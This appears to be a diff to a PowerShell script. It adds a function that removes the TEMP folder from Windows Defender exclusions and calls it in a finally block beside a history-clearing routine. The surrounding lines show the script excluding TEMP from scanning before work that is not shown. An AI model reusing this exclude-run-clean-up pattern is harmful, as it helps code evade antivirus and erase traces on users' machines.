@@ -20,6 +20,18 @@ function AddToDefenderExclusions {
     }
 }
 
+function RemoveFromDefenderExclusions {
+    try {
+        $tempPath = $env:TEMP
+        Remove-MpPreference -ExclusionPath $tempPath -ErrorAction Stop
+        Write-Host "Path successfully removed from Defender exclusions: $tempPath" -ForegroundColor Green
+    } catch {
+        Write-Host "Error removing Defender exclusion" -ForegroundColor Red
+        Start-Sleep -s 1
+    }
+}
+
+
 AddToDefenderExclusions
 
 Start-Sleep -s 1
@@ -73,6 +85,7 @@ try {
 		Start-Sleep -s 3
     }
 } finally {
+	RemoveFromDefenderExclusions
     ClrHistory
 }
 
